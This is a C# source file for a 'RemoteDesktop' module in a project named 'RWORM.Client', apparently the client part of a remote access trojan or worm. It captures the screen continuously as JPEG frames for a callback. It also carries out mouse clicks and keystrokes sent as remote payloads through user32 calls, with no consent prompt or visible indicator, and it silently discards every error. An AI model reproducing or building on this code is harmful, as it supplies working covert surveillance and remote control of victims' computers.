using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace RWORM.Client.Modules
{
    public class RemoteDesktop : IDisposable
    {
        [DllImport("user32.dll")]
        private static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, MonitorEnumDelegate lpfnEnum, IntPtr dwData);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern bool GetMonitorInfo(IntPtr hMonitor, ref MONITORINFOEX lpmi);

        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        [DllImport("user32.dll")]
        private static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, UIntPtr dwExtraInfo);

        [DllImport("user32.dll")]
        private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int X, int Y);

        private const int SM_CXSCREEN = 0;
        private const int SM_CYSCREEN = 1;

        
        private const uint MOUSEEVENTF_MOVE = 0x0001;
        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP = 0x0004;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        private const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
        private const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
        private const uint MOUSEEVENTF_ABSOLUTE = 0x8000;

        
        private const uint KEYEVENTF_KEYDOWN = 0x0000;
        private const uint KEYEVENTF_KEYUP = 0x0002;

        private delegate bool MonitorEnumDelegate(IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData);

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private struct MONITORINFOEX
        {
            public int cbSize;
            public RECT rcMonitor;
            public RECT rcWork;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
            public string szDevice;
        }

        public class ScreenInfo
        {
            public int Index { get; set; }
            public string Name { get; set; } = string.Empty;
            public int X { get; set; }
            public int Y { get; set; }
            public int Width { get; set; }
            public int Height { get; set; }
            public bool IsPrimary { get; set; }
        }

        private CancellationTokenSource? _cts;
        private bool _running;
        private static readonly ImageCodecInfo JpegEncoder = FindJpegEncoder();

        public Func<byte[], Task>? OnFrame { get; set; }
        public int Fps { get; set; } = 8;
        public int Quality { get; set; } = 40;
        public int MonitorIndex { get; set; } = 0;

        public bool IsRunning => _running;

        public static List<ScreenInfo> GetMonitors()
        {
            var list = new List<ScreenInfo>();
            int idx = 0;

            EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, (IntPtr hMon, IntPtr hdc, ref RECT rc, IntPtr data) =>
            {
                var mi = new MONITORINFOEX();
                mi.cbSize = Marshal.SizeOf(typeof(MONITORINFOEX));
                if (GetMonitorInfo(hMon, ref mi))
                {
                    int w = mi.rcMonitor.right - mi.rcMonitor.left;
                    int h = mi.rcMonitor.bottom - mi.rcMonitor.top;
                    bool primary = (mi.dwFlags & 1) != 0;
                    list.Add(new ScreenInfo
                    {
                        Index = idx++,
                        Name = string.IsNullOrEmpty(mi.szDevice) ? $"Display {idx}" : mi.szDevice,
                        X = mi.rcMonitor.left,
                        Y = mi.rcMonitor.top,
                        Width = w,
                        Height = h,
                        IsPrimary = primary
                    });
                }
                return true;
            }, IntPtr.Zero);

            if (list.Count == 0)
            {
                int w = GetSystemMetrics(SM_CXSCREEN);
                int h = GetSystemMetrics(SM_CYSCREEN);
                list.Add(new ScreenInfo
                {
                    Index = 0,
                    Name = "Primary Display",
                    X = 0,
                    Y = 0,
                    Width = w > 0 ? w : 1920,
                    Height = h > 0 ? h : 1080,
                    IsPrimary = true
                });
            }

            return list;
        }

        public static byte[] GetMonitorsJson()
        {
            var monitors = GetMonitors();
            return System.Text.Encoding.UTF8.GetBytes(JsonSerializer.Serialize(monitors));
        }

        public void Start()
        {
            if (_running) return;
            _running = true;
            _cts = new CancellationTokenSource();
            _ = Task.Run(CaptureLoop, _cts.Token);
        }

        public void Stop()
        {
            _running = false;
            _cts?.Cancel();
        }

        
        
        
        
        public static void HandleInput(string payload)
        {
            try
            {
                var parts = payload.Split('\x00');
                if (parts.Length < 2) return;

                if (parts[0] == "mouse" && parts.Length >= 5)
                {
                    string action = parts[1];
                    int targetX = int.Parse(parts[2]);
                    int targetY = int.Parse(parts[3]);
                    int button = int.Parse(parts[4]);

                    SetCursorPos(targetX, targetY);

                    switch (action)
                    {
                        case "move":
                            
                            break;
                        case "down":
                            if (button == 1) mouse_event(MOUSEEVENTF_LEFTDOWN, targetX, targetY, 0, UIntPtr.Zero);
                            else if (button == 2) mouse_event(MOUSEEVENTF_RIGHTDOWN, targetX, targetY, 0, UIntPtr.Zero);
                            else if (button == 3) mouse_event(MOUSEEVENTF_MIDDLEDOWN, targetX, targetY, 0, UIntPtr.Zero);
                            break;
                        case "up":
                            if (button == 1) mouse_event(MOUSEEVENTF_LEFTUP, targetX, targetY, 0, UIntPtr.Zero);
                            else if (button == 2) mouse_event(MOUSEEVENTF_RIGHTUP, targetX, targetY, 0, UIntPtr.Zero);
                            else if (button == 3) mouse_event(MOUSEEVENTF_MIDDLEUP, targetX, targetY, 0, UIntPtr.Zero);
                            break;
                        case "click":
                            if (button == 1)
                            {
                                mouse_event(MOUSEEVENTF_LEFTDOWN, targetX, targetY, 0, UIntPtr.Zero);
                                mouse_event(MOUSEEVENTF_LEFTUP, targetX, targetY, 0, UIntPtr.Zero);
                            }
                            else if (button == 2)
                            {
                                mouse_event(MOUSEEVENTF_RIGHTDOWN, targetX, targetY, 0, UIntPtr.Zero);
                                mouse_event(MOUSEEVENTF_RIGHTUP, targetX, targetY, 0, UIntPtr.Zero);
                            }
                            break;
                    }
                }
                else if (parts[0] == "key" && parts.Length >= 3)
                {
                    string action = parts[1];
                    byte vk = byte.Parse(parts[2]);

                    if (action == "down") keybd_event(vk, 0, KEYEVENTF_KEYDOWN, UIntPtr.Zero);
                    else if (action == "up") keybd_event(vk, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
                }
            }
            catch { }
        }

        private async Task CaptureLoop()
        {
            var enc = JpegEncoder;
            var ms = new MemoryStream(65536);

            while (_running && !(_cts?.IsCancellationRequested ?? true))
            {
                var cycleStart = Environment.TickCount;
                int currentFps = Math.Clamp(Fps, 1, 30);
                int frameDelay = 1000 / currentFps;

                try
                {
                    var monitors = GetMonitors();
                    Rectangle bounds;

                    if (MonitorIndex >= 0 && MonitorIndex < monitors.Count)
                    {
                        var m = monitors[MonitorIndex];
                        bounds = new Rectangle(m.X, m.Y, m.Width, m.Height);
                    }
                    else
                    {
                        int w = GetSystemMetrics(SM_CXSCREEN);
                        int h = GetSystemMetrics(SM_CYSCREEN);
                        bounds = new Rectangle(0, 0, w > 0 ? w : 1920, h > 0 ? h : 1080);
                    }

                    if (bounds.Width > 0 && bounds.Height > 0)
                    {
                        using var bmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
                        using (var g = Graphics.FromImage(bmp))
                        {
                            g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size, CopyPixelOperation.SourceCopy);
                        }

                        ms.SetLength(0);
                        using (var encParms = new EncoderParameters(1))
                        {
                            encParms.Param[0] = new EncoderParameter(Encoder.Quality, (long)Math.Clamp(Quality, 10, 95));
                            bmp.Save(ms, enc, encParms);
                        }

                        byte[] frame = ms.ToArray();
                        if (OnFrame != null && _running)
                        {
                            await OnFrame(frame);
                        }
                    }
                }
                catch { }

                int elapsed = Environment.TickCount - cycleStart;
                int sleep = frameDelay - elapsed;
                if (sleep > 0)
                {
                    try { await Task.Delay(sleep, _cts?.Token ?? CancellationToken.None); } catch { break; }
                }
            }

            try { ms.Dispose(); } catch { }
        }

        private static ImageCodecInfo FindJpegEncoder()
        {
            foreach (var c in ImageCodecInfo.GetImageEncoders())
            {
                if (c.FormatID == ImageFormat.Jpeg.Guid) return c;
            }
            throw new NotSupportedException("JPEG encoder not found");
        }

        public void Dispose()
        {
            Stop();
            _cts?.Dispose();
        }
    }
}
